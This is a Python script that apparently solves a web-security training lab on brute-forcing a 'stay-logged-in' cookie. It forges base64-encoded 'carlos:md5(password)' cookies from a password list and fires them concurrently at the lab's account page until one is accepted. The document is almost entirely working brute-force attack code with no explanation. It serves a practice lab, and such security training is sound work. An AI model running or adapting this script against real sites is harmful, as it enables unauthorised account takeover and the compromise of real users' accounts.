### LAB: Brute-forcing a stay-logged-in cookie

import requests
import threading
import base64
import hashlib

# Read password list
with open('password.txt', 'r') as file:
  passwords = [line.rstrip() for line in file]

############################################################################

# URL LAB ID
url = 'https://0af900810312f192804ec1d4009000cb.web-security-academy.net'

cookie_ = ''

def cookie_bruteforce(password):
  cookie = base64.b64encode(f'carlos:{hashlib.md5(password.encode()).hexdigest()}'.encode()).decode()
  cookies = { 'stay-logged-in' : cookie}
  response = requests.get(url = url + '/my-account?id=carlos', cookies=cookies , allow_redirects=False)
  if response.status_code == 200:
    global cookie_
    cookie_ = cookie


threads = []
for i in range(len(passwords)):
  threads.append(threading.Thread(target=cookie_bruteforce, args=(passwords[i],)))
  threads[i].start()

for i in range(len(passwords)):
  threads[i].join()
  
print(f'Stay logged in cookie: {cookie_}')